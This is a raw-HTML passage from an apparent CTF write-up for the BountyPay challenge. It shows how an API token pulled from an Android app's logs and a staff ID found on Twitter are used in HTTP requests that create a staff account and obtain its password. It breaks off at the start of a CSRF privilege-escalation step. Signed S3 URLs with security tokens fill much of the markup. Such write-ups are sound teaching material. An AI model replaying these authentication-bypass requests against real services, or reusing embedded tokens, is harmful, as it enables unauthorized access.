data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rZLkwmMvvr2cM5Nrgk8xZCUp?response-content-disposition=attachment%3B%20filename%3D%22apk-2.png%22%3B%20filename%2A%3DUTF-8%27%27apk-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=4d10430624cd754ebd00db1b580f1b5910efc5c69072bb4c461d8f431b08a244\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rZLkwmMvvr2cM5Nrgk8xZCUp?response-content-disposition=attachment%3B%20filename%3D%22apk-2.png%22%3B%20filename%2A%3DUTF-8%27%27apk-2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=4d10430624cd754ebd00db1b580f1b5910efc5c69072bb4c461d8f431b08a244\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI got the \u003ccode\u003eHOST\u003c/code\u003e header and the \u003ccode\u003eX-Token\u003c/code\u003e header in Android Studio\u0026#39;s Logcat\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST¬†IS:: http://api.bountypay.h1ctf.com\n2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN¬†IS:: 8e9998ee3137ca9ade8f372739f062c1\n2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER¬†VALUE¬†AND¬†HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"apk-logcat.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ke12KSbVEVXy7hbK6kGwgk6Q?response-content-disposition=attachment%3B%20filename%3D%22apk-logcat.png%22%3B%20filename%2A%3DUTF-8%27%27apk-logcat.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=26f4b8d736008d8e721da6f39b6e15e935c21747ed0b01a6859ac47273f6bf69\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ke12KSbVEVXy7hbK6kGwgk6Q?response-content-disposition=attachment%3B%20filename%3D%22apk-logcat.png%22%3B%20filename%2A%3DUTF-8%27%27apk-logcat.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=26f4b8d736008d8e721da6f39b6e15e935c21747ed0b01a6859ac47273f6bf69\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt\u0026#39;s important to note that I didn\u0026#39;t really have to open the APK in an emulator, as I could have edited the \u003ccode\u003euser_created.xml\u003c/code\u003e via \u003ccode\u003eadb\u003c/code\u003e. However, I wanted to actually see what I was facing with as it made it much more clear for me. \u003c/p\u003e\n\n\u003cp\u003eThe last Activity had helped me to figure that there\u0026#39;s more than just a token and a host. There were two more things that will be useful in the next two steps: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThere\u0026#39;s a POST request to the exposed host, but something is missing. \u003c/li\u003e\n\u003cli\u003eThe twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch3 id=\"step-8-information-disclosure-twitter-account\"\u003eStep 8 - Information Disclosure (Twitter Account)\u003c/h3\u003e\n\n\u003cp\u003eBountyPay\u0026#39;s \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eTwitter account\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Fstatus%2F1258692286256500741\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweeted a welcome message\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: \u003cbr\u003e\n\u003ca title=\"https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114%2Fstatus%2F1258693001964068864%2Fphoto%2F1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"sandra-allison.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyYuDeyrZqgPuZ2gtC8iXJff?response-content-disposition=attachment%3B%20filename%3D%22sandra-allison.png%22%3B%20filename%2A%3DUTF-8%27%27sandra-allison.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=6f7ad97cdade6da2097298e5c6e071a5677f1cd87772d496adb147a0e8b8084c\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyYuDeyrZqgPuZ2gtC8iXJff?response-content-disposition=attachment%3B%20filename%3D%22sandra-allison.png%22%3B%20filename%2A%3DUTF-8%27%27sandra-allison.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070744Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=6f7ad97cdade6da2097298e5c6e071a5677f1cd87772d496adb147a0e8b8084c\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"step-9-authentication-bypass-creating-sandra-s-user\"\u003eStep 9 - Authentication Bypass (Creating Sandra\u0026#39;s user)\u003c/h3\u003e\n\n\u003cp\u003eAfter I saw the POST request in the APK together with the host and the X-Token header, I went back to my notes, as I remembered that there were few endpoints that I wasn\u0026#39;t able to test due to a missing token. \u003c/p\u003e\n\n\u003cp\u003eI first tried to hit \u003ccode\u003ehttps://api.bountypay.h1ctf.com/api/staff\u003c/code\u003e using the X-Token. This gave me an interesting result: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eGET /api/staff? HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponse\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e[{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;Sam Jenkins\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;STF:84DJKEIP38\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e,\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;Brian Oliver\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;STF:KE624RQ2T9\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter I saw this, I tried to do the same with the following POST request: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ePOST /api/staff?firstParam\u003cspan class=\"o\"\u003e=\u003c/span\u003eUGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\n\u003cspan class=\"nv\"\u003estaff_id\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eSTF:84DJKEIP38\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut that resutled with the following reponse: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Wed, 03 Jun 2020 13:15:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 39\n\n\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Staff Member already has an account\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eClearly, as Sandra was part of the staff, I went back to Sandra\u0026#39;s id and tried her \u003ccode\u003estaff_id\u003c/code\u003e: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ePOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 36\nContent-Type: application/x-www-form-urlencoded\n\n\u003cspan class=\"nv\"\u003estaff_id\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eSTF:8FJ3KFISL3\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd got the following response: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eHTTP/1.1 201 Created\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Wed, 03 Jun 2020 19:42:33 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 110\n\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;Staff Member Account Created\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;sandra.allison\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;s%3D8qB8zEpMnc*xsz7Yp5\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"step-10-csrf-parameter-pollution-privilege-escalation-via-csrf\"\u003eStep 10 - CSRF, Parameter Pollution, Privilege Escalation via CSRF\u003c/h3\u003e\n\n\u003cp\u003eOnce I got staff credentials, I opened \u003ca title=\"https://staff.bountypay.h1ctf.com\" href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staff.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and logged in with Sandra\u0026#39;s account. \u003c/p\u003e\n\n\u003cp\u003eThe staff dashboard introduced a \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fjs%2Fwebsite.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ejavascript file\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that looked like the right place to start from:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e.upgradeToAdmin\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einput[name=\u0026quot;username\u0026quot;]\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eval\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/admin/upgrade?username=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan 